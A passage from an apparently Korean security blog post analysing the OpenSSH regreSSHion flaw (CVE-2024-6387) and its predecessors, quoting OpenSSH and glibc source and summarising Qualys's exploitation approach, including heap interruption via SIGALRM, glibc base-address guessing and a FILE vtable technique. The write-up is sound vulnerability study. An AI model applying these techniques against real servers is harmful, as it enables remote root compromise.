<p><code class="language-plaintext highlighter-rouge">CVE-2006-5051</code>은 <code class="language-plaintext highlighter-rouge">async-signal-unsafe</code> 함수를 호출해서 발생합니다. 바로 직접적인 호출은 아니며 위에서 살펴본대로 다음과 같은 과정으로 <code class="language-plaintext highlighter-rouge">async-signal-unsafe</code> 함수가 호출됩니다.</p>

<p align="center"><img src="/assets/img/CVE-2024-6387/function_call_diagram.png" /></p>

<p>이와 같은 <code class="language-plaintext highlighter-rouge">SIGALRM</code> 핸들러의 허점을 이용해 <code class="language-plaintext highlighter-rouge">malloc/free</code> 함수 처리 중 특정 지점에서의 처리를 중단시키고 <code class="language-plaintext highlighter-rouge">malloc/free</code>에 재진입하여 익스플로잇을 성공시킵니다.</p>

<h2 id="cve-2006-5051-patch-incorrect-fix">CVE-2006-5051 Patch (Incorrect fix)</h2>

<p>위에서 알아본 취약점은 <code class="language-plaintext highlighter-rouge">CVE-2006-5051</code> 패치에 의해 다음과 같이 수정되었습니다.</p>

<p><code class="language-plaintext highlighter-rouge">OpenSSH 4.4</code> 버전의 코드는 다음과 같습니다.</p>

<p>먼저 sshd.c에서의 <code class="language-plaintext highlighter-rouge">grace_alarm_handler</code>는 다음과 같이 변경되었습니다.</p>

<p>4.3p2</p>
<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/grace_alarm_handler_4.3p2.png" /></p>

<p>4.4</p>
<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/grace_alarm_handler_4.4.png" /></p>

<p>4.4에선 <code class="language-plaintext highlighter-rouge">sigdie</code>를 호출하는 형태로 바뀌었습니다. <code class="language-plaintext highlighter-rouge">sigdie</code>는 이전 버전과 동일하게 <code class="language-plaintext highlighter-rouge">do_log</code>를 호출합니다.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">sigdie</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,...)</span>
<span class="p">{</span>
	<span class="kt">va_list</span> <span class="n">args</span><span class="p">;</span>

	<span class="n">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
	<span class="n">do_log</span><span class="p">(</span><span class="n">SYSLOG_LEVEL_FATAL</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
	<span class="n">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
	<span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>하지만 <code class="language-plaintext highlighter-rouge">do_log</code>에서 여전히 <code class="language-plaintext highlighter-rouge">syslog</code>를 호출하는 모습이 보입니다.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>

<span class="kt">void</span>
<span class="nf">do_log</span><span class="p">(</span><span class="n">LogLevel</span> <span class="n">level</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">args</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
		<span class="n">syslog</span><span class="p">(</span><span class="n">pri</span><span class="p">,</span> <span class="s">"%.500s"</span><span class="p">,</span> <span class="n">fmtbuf</span><span class="p">);</span>
<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>잘못된 패치가 이루어졌고 해당 취약점은 여전히 존재하는 상태가 됩니다.</p>

<h2 id="cve-2008-4109-patch">CVE-2008-4109 Patch</h2>

<p>앞서 알아본 취약점은 <a href="https://nvd.nist.gov/vuln/detail/CVE-2008-4109"><code class="language-plaintext highlighter-rouge">CVE-2008-4109</code></a> 패치에서 비로소 수정됩니다.</p>

<blockquote>
  <p>A certain Debian patch for OpenSSH before 4.3p2-9etch3 on etch; before 4.6p1-1 on sid and lenny; and on other distributions such as SUSE uses functions that are not async-signal-safe in the signal handler for login timeouts, which allows remote attackers to cause a denial of service (connection slot exhaustion) via multiple login attempts. NOTE: this issue exists because of an incorrect fix for CVE-2006-5051.</p>
</blockquote>

<p>OpenSSH 4.5p1 <code class="language-plaintext highlighter-rouge">grace_alarm_handler</code></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Signal handler for the alarm after the login grace period has expired.
 */</span>
<span class="cm">/*ARGSUSED*/</span>
<span class="k">static</span> <span class="kt">void</span>
<span class="nf">grace_alarm_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">use_privsep</span> <span class="o">&amp;&amp;</span> <span class="n">pmonitor</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">pmonitor</span><span class="o">-&gt;</span><span class="n">m_pid</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">kill</span><span class="p">(</span><span class="n">pmonitor</span><span class="o">-&gt;</span><span class="n">m_pid</span><span class="p">,</span> <span class="n">SIGALRM</span><span class="p">);</span>

	<span class="cm">/* Log error and exit. */</span>
	<span class="n">sigdie</span><span class="p">(</span><span class="s">"Timeout before authentication for %s"</span><span class="p">,</span> <span class="n">get_remote_ipaddr</span><span class="p">());</span>
<span class="p">}</span>
</code></pre></div></div>

<p>OpenSSH 4.5p1 <code class="language-plaintext highlighter-rouge">sigdie</code></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">sigdie</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,...)</span>
<span class="p">{</span>
<span class="cp">#ifdef DO_LOG_SAFE_IN_SIGHAND
</span>	<span class="kt">va_list</span> <span class="n">args</span><span class="p">;</span>

	<span class="n">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
	<span class="n">do_log</span><span class="p">(</span><span class="n">SYSLOG_LEVEL_FATAL</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
	<span class="n">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
<span class="cp">#endif
</span>	<span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">grace_alarm_handler</code>에서 호출되는 <code class="language-plaintext highlighter-rouge">sigdie</code>에는 전처리 코드가 삽입되어 <code class="language-plaintext highlighter-rouge">DO_LOG_SAFE_IN_SIGHAND</code>를 정의하지 않는이상
<code class="language-plaintext highlighter-rouge">do_log</code>를 호출하는 일은 없어졌습니다.</p>

<h2 id="cve-2024-6387-regresshion">CVE-2024-6387 (RegreSSHion)</h2>

<p>앞서 살펴본 취약점인 <code class="language-plaintext highlighter-rouge">CVE-2006-5051</code>과 <code class="language-plaintext highlighter-rouge">CVE-2008-4109</code>는 위에서 적용된 <code class="language-plaintext highlighter-rouge">#ifdef DO_LOG_SAFE_IN_SIGHAND</code>가 실수로 제거되어 <a href="https://github.com/openssh/openssh-portable/commit/752250c"><code class="language-plaintext highlighter-rouge">commit 752250c</code></a>(OpenSSH 8.5p1)에 의해서 부활하게됩니다.</p>

<p>코드가 어떻게 바뀌었는지 확인해봅시다.</p>

<p>grace_alarm_handler</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Signal handler for the alarm after the login grace period has expired.
 */</span>
<span class="cm">/*ARGSUSED*/</span>
<span class="k">static</span> <span class="kt">void</span>
<span class="nf">grace_alarm_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">use_privsep</span> <span class="o">&amp;&amp;</span> <span class="n">pmonitor</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">pmonitor</span><span class="o">-&gt;</span><span class="n">m_pid</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">kill</span><span class="p">(</span><span class="n">pmonitor</span><span class="o">-&gt;</span><span class="n">m_pid</span><span class="p">,</span> <span class="n">SIGALRM</span><span class="p">);</span>

	<span class="cm">/*
	 * Try to kill any processes that we have spawned, E.g. authorized
	 * keys command helpers.
	 */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">getpgid</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">getpid</span><span class="p">())</span> <span class="p">{</span>
		<span class="n">ssh_signal</span><span class="p">(</span><span class="n">SIGTERM</span><span class="p">,</span> <span class="n">SIG_IGN</span><span class="p">);</span>
		<span class="n">kill</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">SIGTERM</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="cm">/* XXX pre-format ipaddr/port so we don't need to access active_state */</span>
	<span class="cm">/* Log error and exit. */</span>
	<span class="n">sigdie</span><span class="p">(</span><span class="s">"Timeout before authentication for %s port %d"</span><span class="p">,</span>
	    <span class="n">ssh_remote_ipaddr</span><span class="p">(</span><span class="n">the_active_state</span><span class="p">),</span>
	    <span class="n">ssh_remote_port</span><span class="p">(</span><span class="n">the_active_state</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<p>여기서 <code class="language-plaintext highlighter-rouge">sigdie</code>는 매크로로 <code class="language-plaintext highlighter-rouge">sshsigdie</code>로 확장됩니다.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define sigdie(...)		sshsigdie(__FILE__, __func__, __LINE__, 0, SYSLOG_LEVEL_ERROR, NULL, __VA_ARGS__)
</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">sshsigdie</code>는 다음과 같이 정의되어있습니다. 이때 <code class="language-plaintext highlighter-rouge">sshsigdie</code>는 <code class="language-plaintext highlighter-rouge">sshlogv</code>를 호출합니다.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">sshsigdie</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">func</span><span class="p">,</span> <span class="kt">int</span> <span class="n">line</span><span class="p">,</span> <span class="kt">int</span> <span class="n">showfunc</span><span class="p">,</span>
    <span class="n">LogLevel</span> <span class="n">level</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">suffix</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="p">...)</span>
<span class="p">{</span>
	<span class="kt">va_list</span> <span class="n">args</span><span class="p">;</span>

	<span class="n">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
	<span class="n">sshlogv</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">func</span><span class="p">,</span> <span class="n">line</span><span class="p">,</span> <span class="n">showfunc</span><span class="p">,</span> <span class="n">SYSLOG_LEVEL_FATAL</span><span class="p">,</span>
	    <span class="n">suffix</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
	<span class="n">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
	<span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>결과적으로 <code class="language-plaintext highlighter-rouge">sshlogv</code>는 그전에 패치로 호출되지 않게했던 <code class="language-plaintext highlighter-rouge">do_log</code>를 다시 호출하게됩니다.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">sshlogv</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">func</span><span class="p">,</span> <span class="kt">int</span> <span class="n">line</span><span class="p">,</span> <span class="kt">int</span> <span class="n">showfunc</span><span class="p">,</span>
    <span class="n">LogLevel</span> <span class="n">level</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">suffix</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">args</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">char</span> <span class="n">tag</span><span class="p">[</span><span class="mi">128</span><span class="p">],</span> <span class="n">fmt2</span><span class="p">[</span><span class="n">MSGBUFSIZ</span> <span class="o">+</span> <span class="mi">128</span><span class="p">];</span>
	<span class="kt">int</span> <span class="n">forced</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cp</span><span class="p">;</span>
	<span class="kt">size_t</span> <span class="n">i</span><span class="p">;</span>

	<span class="n">snprintf</span><span class="p">(</span><span class="n">tag</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">tag</span><span class="p">),</span> <span class="s">"%.48s:%.48s():%d"</span><span class="p">,</span>
	    <span class="p">(</span><span class="n">cp</span> <span class="o">=</span> <span class="n">strrchr</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="sc">'/'</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">?</span> <span class="n">file</span> <span class="o">:</span> <span class="n">cp</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">func</span><span class="p">,</span> <span class="n">line</span><span class="p">);</span>
	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nlog_verbose</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">match_pattern_list</span><span class="p">(</span><span class="n">tag</span><span class="p">,</span> <span class="n">log_verbose</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">forced</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">log_handler</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">forced</span><span class="p">)</span>
		<span class="n">snprintf</span><span class="p">(</span><span class="n">fmt2</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fmt2</span><span class="p">),</span> <span class="s">"%s: %s"</span><span class="p">,</span> <span class="n">tag</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
	<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">showfunc</span><span class="p">)</span>
		<span class="n">snprintf</span><span class="p">(</span><span class="n">fmt2</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fmt2</span><span class="p">),</span> <span class="s">"%s: %s"</span><span class="p">,</span> <span class="n">func</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
	<span class="k">else</span>
		<span class="n">strlcpy</span><span class="p">(</span><span class="n">fmt2</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fmt2</span><span class="p">));</span>

	<span class="n">do_log</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">func</span><span class="p">,</span> <span class="n">line</span><span class="p">,</span> <span class="n">level</span><span class="p">,</span> <span class="n">forced</span><span class="p">,</span> <span class="n">suffix</span><span class="p">,</span> <span class="n">fmt2</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">do_log</code>는 여전히 <code class="language-plaintext highlighter-rouge">syslog</code>를 호출하고 있으며 <code class="language-plaintext highlighter-rouge">glibc</code>의 <code class="language-plaintext highlighter-rouge">syslog</code>는 여전히 비동기 시그널에 대해 안전하지 않기 때문에 보안 회귀가 발생합니다.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span>
<span class="nf">do_log</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">func</span><span class="p">,</span> <span class="kt">int</span> <span class="n">line</span><span class="p">,</span> <span class="n">LogLevel</span> <span class="n">level</span><span class="p">,</span>
    <span class="kt">int</span> <span class="n">force</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">suffix</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">args</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
		<span class="n">syslog</span><span class="p">(</span><span class="n">pri</span><span class="p">,</span> <span class="s">"%.500s"</span><span class="p">,</span> <span class="n">fmtbuf</span><span class="p">);</span>
<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>
<p>이로인해 해당 패치가 도입된 <code class="language-plaintext highlighter-rouge">8.5p1</code>부터 <code class="language-plaintext highlighter-rouge">9.8p1</code> 패치가 적용되기 이전까지 <code class="language-plaintext highlighter-rouge">glibc-based</code> 리눅스 시스템에서 취약점이 발생하게 됩니다.</p>

<p align="center"><img src="/assets/img/CVE-2024-6387/regresshion_attack.png" /><a href="https://upload.wikimedia.org/wikipedia/commons/8/83/Resultant.png">https://upload.wikimedia.org/wikipedia/commons/8/83/Resultant.png</a></p>

<h2 id="exploit">Exploit</h2>

<p>본 취약점을 제보한 Qualys는 위 취약점(CVE-2024-6387)의 악용방법을 32bit glibc기반의 리눅스에서 입증했습니다. 또한 다른 버전에서도 악용 가능 지점을 찾아 특정 버전에 대한 악용 가능성을 연구를 진행했습니다.</p>

<p>연구 개요는 다음과 같습니다.</p>

<h3 id="ssh-20-openssh_34p1-debian-134p1-1woody3-debian-30r6-from-2005">SSH-2.0-OpenSSH_3.4p1 Debian 1:3.4p1-1.woody.3 (Debian 3.0r6, from 2005)</h3>

<p><code class="language-plaintext highlighter-rouge">DSA</code>의 공개 키 파싱 지점에서 호출되는 <code class="language-plaintext highlighter-rouge">free</code>를 취약점을 이용해 중간에 처리를 중단시키고,
완전한 처리가 이루어지지 않은 <code class="language-plaintext highlighter-rouge">heap chunk</code>에 대해 <code class="language-plaintext highlighter-rouge">grace_alarm_handler</code>에 의해 호출되는 <code class="language-plaintext highlighter-rouge">free</code>를 통해
공격을 수행합니다.</p>

<p>해당 공격을 성공시키기위해 600초의 로그인 유예 시간 동안 10개의 연결(MaxStartups)을 수용할 경우 약 10,000번의 시도가 필요하며 원격 루트 쉘을 얻기 위해 평균적으로 약 1주일 정도가 소요됩니다.</p>

<h3 id="ssh-20-openssh_42p1-debian-7ubuntu3-ubuntu-6061-from-2006">SSH-2.0-OpenSSH_4.2p1 Debian-7ubuntu3 (Ubuntu 6.06.1, from 2006)</h3>

<p>해당 버전의 연구에선 <code class="language-plaintext highlighter-rouge">CVE-2006-5051</code>에서 언급된 <code class="language-plaintext highlighter-rouge">GSSAPI</code>를 <code class="language-plaintext highlighter-rouge">GSSAPI</code> 기능은 기본적으로 활성화되어있지 않기 때문에
취약점을 악용할 포인트로 사용하지 않고 기본적으로 활성화된 <code class="language-plaintext highlighter-rouge">PAM</code> 기능을 이용합니다.</p>

<p>해당 공격을 성공시키기위해 120초의 로그인 유예 시간 동안 10개의 연결(MaxStartups)을 수용할 경우 약 10,000번의 시도가 필요하며 원격 루트 쉘을 얻기 위해 약 1~2일 정도가 소요됩니다.</p>

<h3 id="ssh-20-openssh_92p1-debian-2deb12u2-debian-1250-from-2024">SSH-2.0-OpenSSH_9.2p1 Debian-2.+deb12u2 (Debian 12.5.0 from 2024)</h3>

<blockquote>
  <p>🧪 아래 서술된 Exploit은 <code class="language-plaintext highlighter-rouge">_vtable_offset</code>을 사용하지 않는 경우 <code class="language-plaintext highlighter-rouge">_IO_wfile_underflow</code>의 유도가 불가능하기때문에 glibc 32bit에서만 유효합니다.</p>
</blockquote>

<details>
<summary>⁉️</summary>
<div>
    <p>다음 glibc-2.36의 소스 코드의 주석을 확인해봅시다.</p>

    <p>libioP.h</p>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Setting this macro to 1 enables the use of the _vtable_offset bias
   in _IO_JUMPS_FUNCS, below.  This is only needed for new-format
   _IO_FILE in libc that must support old binaries (see oldfileops.c).  */</span>
<span class="cp">#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1) &amp;&amp; !defined _IO_USE_OLD_IO_FILE
# define _IO_JUMPS_OFFSET 1
#else
# define _IO_JUMPS_OFFSET 0
#endif
</span></code></pre></div>    </div>

    <p>위와 같은 경우 컴파일 설정에 따라 <code class="language-plaintext highlighter-rouge">_IO_JUMPS_OFFSET</code>을 <code class="language-plaintext highlighter-rouge">1</code>로 만들어 활성화하거나 <code class="language-plaintext highlighter-rouge">0</code>으로 만들어 일부 매크로를 다르게 만들 수 있습니다.</p>

    <p>이에따라 다음과 같은 매크로에 차이가 생깁니다.</p>

    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#if _IO_JUMPS_OFFSET
# define _IO_JUMPS_FUNC(THIS) \
  (IO_validate_vtable                                                   \
   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)	\
			     + (THIS)-&gt;_vtable_offset)))
# define _IO_JUMPS_FUNC_UPDATE(THIS, VTABLE)				\
  (*(const struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)	\
				  + (THIS)-&gt;_vtable_offset) = (VTABLE))
# define _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset
#else
# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))
# define _IO_JUMPS_FUNC_UPDATE(THIS, VTABLE) \
  (_IO_JUMPS_FILE_plus (THIS) = (VTABLE))
# define _IO_vtable_offset(THIS) 0
#endif
</span></code></pre></div>    </div>

    <p>위에서 본 _IO_JUMPS_OFFSET을 0으로 만든다면 설정에 의해 <code class="language-plaintext highlighter-rouge">_IO_JUMPS_FUNC</code>에서 <code class="language-plaintext highlighter-rouge">_vtable_offset</code> 필드를 사용하지 않게되고
이로인해서 공격이 통하지 않을 수 있습니다.</p>

    <p>이는 원 연구글에도 나와있으며 따라서 아래에 설명하는 공격은 i386 glibc에만 해당하게됩니다.</p>

    <blockquote>
      <p>Eventually, we devised the following technique (which seems to be
specific to the i386 glibc – the amd64 glibc does not seem to use
_vtable_offset at all):</p>
    </blockquote>

    <p>– [접은글의 끝입니다] –</p>
  </div>
</details>

<p>해당 버전의 연구에선 <code class="language-plaintext highlighter-rouge">syslog</code>를 호출하는 점을 이용합니다. PoC에선 현재 환경에서의 취약성을 종합해서 악용하기 때문에 자세히 알아봅시다.</p>

<p>연구에 사용된 <code class="language-plaintext highlighter-rouge">Debian</code>은 i386에 경우 glibc(2.36)가 항상 <code class="language-plaintext highlighter-rouge">0xb7200000</code> 또는 <code class="language-plaintext highlighter-rouge">0xb7400000</code>에 매핑되기 때문에 절반의 확률로 PIE를 무력화 시킬 수 있습니다.</p>

<p>앞서 알아본 순서로 <code class="language-plaintext highlighter-rouge">syslog</code>가 <code class="language-plaintext highlighter-rouge">grace_alarm_handler</code>에 의해서 호출됩니다.</p>

<p>연구에 사용된 <code class="language-plaintext highlighter-rouge">Debian</code>버전의 glibc(2.36)는 <a href="https://sourceware.org/git/?p=glibc.git;a=commit;h=a15d53e2de4c7d83bda251469d92a3c7b49a90db">단일 스레드 환경에대한 락을 진행하지 않기 때문</a>에 취약점을 성공적으로 악용할 수 있습니다.</p>

<p>이를 이용해 <code class="language-plaintext highlighter-rouge">malloc</code> 호출을 SIGALRM을 통해 중간에 중단시킨 후 <code class="language-plaintext highlighter-rouge">SIGALRM</code>에서 사용하는 <code class="language-plaintext highlighter-rouge">malloc</code>을 통해 완전히 처리되지 않은 <code class="language-plaintext highlighter-rouge">heap chunk</code>를 악용합니다.</p>

<p>해당 공격을 성공시키위해 120초의 로그인 유예 시간 동안 100개의 연결(MaxStartups)을 수용할 경우 원격 루트 쉘을 얻기 위해 약 6~8시간이 소요됩니다.</p>

<p>glibc 2.36에서 <code class="language-plaintext highlighter-rouge">syslog</code>에서는 다음과 같은 흐름으로 <code class="language-plaintext highlighter-rouge">fopen</code>을 호출해 <code class="language-plaintext highlighter-rouge">FILE</code> 구조체를 만들고 있습니다.</p>
<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/call_graph.png" /></p>

<details>
<summary>/misc/syslog.c:__syslog,__vsyslog_internal</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * syslog, vsyslog --
 *	print message on log file; output is intended for syslogd(8).
 */</span>
<span class="kt">void</span>
<span class="nf">__syslog</span> <span class="p">(</span><span class="kt">int</span> <span class="n">pri</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="p">...)</span>
<span class="p">{</span>
  <span class="kt">va_list</span> <span class="n">ap</span><span class="p">;</span>

  <span class="n">va_start</span> <span class="p">(</span><span class="n">ap</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
  <span class="n">__vsyslog_internal</span> <span class="p">(</span><span class="n">pri</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">ap</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">va_end</span> <span class="p">(</span><span class="n">ap</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">ldbl_hidden_def</span> <span class="p">(</span><span class="n">__syslog</span><span class="p">,</span> <span class="n">syslog</span><span class="p">)</span>
<span class="n">ldbl_strong_alias</span> <span class="p">(</span><span class="n">__syslog</span><span class="p">,</span> <span class="n">syslog</span><span class="p">)</span>

<span class="kt">void</span>
<span class="nf">__vsyslog_internal</span> <span class="p">(</span><span class="kt">int</span> <span class="n">pri</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">ap</span><span class="p">,</span>
		    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">mode_flags</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
  <span class="k">struct</span> <span class="n">tm</span> <span class="o">*</span><span class="n">now_tmp</span> <span class="o">=</span> <span class="n">__localtime64_r</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">now</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">now_tm</span><span class="p">);</span>
<span class="p">...</span>
<span class="p">}</span>
</code></pre></div>    </div>
  </div>
</details>
<details>
<summary>/time/localtime.c:__localtime64_r</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Return the `struct tm' representation of *T in local time,
   using *TP to store the result.  */</span>
<span class="k">struct</span> <span class="n">tm</span> <span class="o">*</span>
<span class="nf">__localtime64_r</span> <span class="p">(</span><span class="k">const</span> <span class="n">__time64_t</span> <span class="o">*</span><span class="n">t</span><span class="p">,</span> <span class="k">struct</span> <span class="n">tm</span> <span class="o">*</span><span class="n">tp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">return</span> <span class="n">__tz_convert</span> <span class="p">(</span><span class="o">*</span><span class="n">t</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">tp</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>    </div>
  </div>
</details>
<details>
<summary>/time/tzset.c:__tz_convert,tzset_internal</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Return the `struct tm' representation of TIMER in the local timezone.
   Use local time if USE_LOCALTIME is nonzero, UTC otherwise.  */</span>
<span class="k">struct</span> <span class="n">tm</span> <span class="o">*</span>
<span class="nf">__tz_convert</span> <span class="p">(</span><span class="n">__time64_t</span> <span class="n">timer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">use_localtime</span><span class="p">,</span> <span class="k">struct</span> <span class="n">tm</span> <span class="o">*</span><span class="n">tp</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
  <span class="cm">/* Update internal database according to current TZ setting.
     POSIX.1 8.3.7.2 says that localtime_r is not required to set tzname.
     This is a good idea since this allows at least a bit more parallelism.  */</span>
  <span class="n">tzset_internal</span> <span class="p">(</span><span class="n">tp</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">_tmbuf</span> <span class="o">&amp;&amp;</span> <span class="n">use_localtime</span><span class="p">);</span>
<span class="p">...</span>
<span class="p">}</span>
<span class="p">...</span>
<span class="cm">/* Interpret the TZ envariable.  */</span>
<span class="k">static</span> <span class="kt">void</span>
